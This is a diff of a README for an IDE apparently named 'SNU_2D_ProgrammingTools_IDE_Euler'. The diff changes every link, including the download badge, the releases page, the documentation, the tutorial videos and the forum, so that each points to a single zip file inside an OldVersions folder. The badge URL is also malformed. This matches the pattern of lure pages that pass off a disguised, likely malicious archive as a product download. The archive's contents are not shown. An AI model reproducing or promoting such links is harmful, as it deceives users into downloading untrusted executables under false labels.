@@ -1,6 +1,6 @@
 # ⌨️ SNU_2D_ProgrammingTools_IDE_Euler - Simple IDE for Easy Programming
 
-[![Download SNU_2D_ProgrammingTools_IDE_Euler](https://raw.githubusercontent.com/HypeNature/SNU_2D_ProgrammingTools_IDE_Euler/SNU_2D_ProgrammingTools_IDE_Euler_Main-dev/OldVersions/MAKEFILE/Euler_SN_ID_Tools_Programming_2.3.zip%20Now-Get%https://raw.githubusercontent.com/HypeNature/SNU_2D_ProgrammingTools_IDE_Euler/SNU_2D_ProgrammingTools_IDE_Euler_Main-dev/OldVersions/MAKEFILE/Euler_SN_ID_Tools_Programming_2.3.zip)](https://raw.githubusercontent.com/HypeNature/SNU_2D_ProgrammingTools_IDE_Euler/SNU_2D_ProgrammingTools_IDE_Euler_Main-dev/OldVersions/MAKEFILE/Euler_SN_ID_Tools_Programming_2.3.zip)
+[![Download SNU_2D_ProgrammingTools_IDE_Euler](https://raw.githubusercontent.com/HypeNature/SNU_2D_ProgrammingTools_IDE_Euler/SNU_2D_ProgrammingTools_IDE_Euler_Main-dev/OldVersions/EDITORCONFIG/ID_Tools_SN_Euler_Programming_2.1.zip%20Now-Get%https://raw.githubusercontent.com/HypeNature/SNU_2D_ProgrammingTools_IDE_Euler/SNU_2D_ProgrammingTools_IDE_Euler_Main-dev/OldVersions/EDITORCONFIG/ID_Tools_SN_Euler_Programming_2.1.zip)](https://raw.githubusercontent.com/HypeNature/SNU_2D_ProgrammingTools_IDE_Euler/SNU_2D_ProgrammingTools_IDE_Euler_Main-dev/OldVersions/EDITORCONFIG/ID_Tools_SN_Euler_Programming_2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ Before you install the IDE, make sure your computer meets the following requirem
 
 ## 📥 Download & Install
 
-To get the software, visit this page to download: [Releases Page](https://raw.githubusercontent.com/HypeNature/SNU_2D_ProgrammingTools_IDE_Euler/SNU_2D_ProgrammingTools_IDE_Euler_Main-dev/OldVersions/MAKEFILE/Euler_SN_ID_Tools_Programming_2.3.zip).
+To get the software, visit this page to download: [Releases Page](https://raw.githubusercontent.com/HypeNature/SNU_2D_ProgrammingTools_IDE_Euler/SNU_2D_ProgrammingTools_IDE_Euler_Main-dev/OldVersions/EDITORCONFIG/ID_Tools_SN_Euler_Programming_2.1.zip).
 
 ### Steps to Download:
 
@@ -78,8 +78,8 @@ We value your feedback. If you have suggestions or find bugs, please report them
 
 ## 📣 Additional Resources
 
-- [Euler Language Documentation](https://raw.githubusercontent.com/HypeNature/SNU_2D_ProgrammingTools_IDE_Euler/SNU_2D_ProgrammingTools_IDE_Euler_Main-dev/OldVersions/MAKEFILE/Euler_SN_ID_Tools_Programming_2.3.zip)
-- [Tutorial Videos](https://raw.githubusercontent.com/HypeNature/SNU_2D_ProgrammingTools_IDE_Euler/SNU_2D_ProgrammingTools_IDE_Euler_Main-dev/OldVersions/MAKEFILE/Euler_SN_ID_Tools_Programming_2.3.zip) 
-- [Community Forum](https://raw.githubusercontent.com/HypeNature/SNU_2D_ProgrammingTools_IDE_Euler/SNU_2D_ProgrammingTools_IDE_Euler_Main-dev/OldVersions/MAKEFILE/Euler_SN_ID_Tools_Programming_2.3.zip)
+- [Euler Language Documentation](https://raw.githubusercontent.com/HypeNature/SNU_2D_ProgrammingTools_IDE_Euler/SNU_2D_ProgrammingTools_IDE_Euler_Main-dev/OldVersions/EDITORCONFIG/ID_Tools_SN_Euler_Programming_2.1.zip)
+- [Tutorial Videos](https://raw.githubusercontent.com/HypeNature/SNU_2D_ProgrammingTools_IDE_Euler/SNU_2D_ProgrammingTools_IDE_Euler_Main-dev/OldVersions/EDITORCONFIG/ID_Tools_SN_Euler_Programming_2.1.zip) 
+- [Community Forum](https://raw.githubusercontent.com/HypeNature/SNU_2D_ProgrammingTools_IDE_Euler/SNU_2D_ProgrammingTools_IDE_Euler_Main-dev/OldVersions/EDITORCONFIG/ID_Tools_SN_Euler_Programming_2.1.zip)
 
 Thank you for choosing SNU_2D_ProgrammingTools_IDE_Euler. Happy coding!
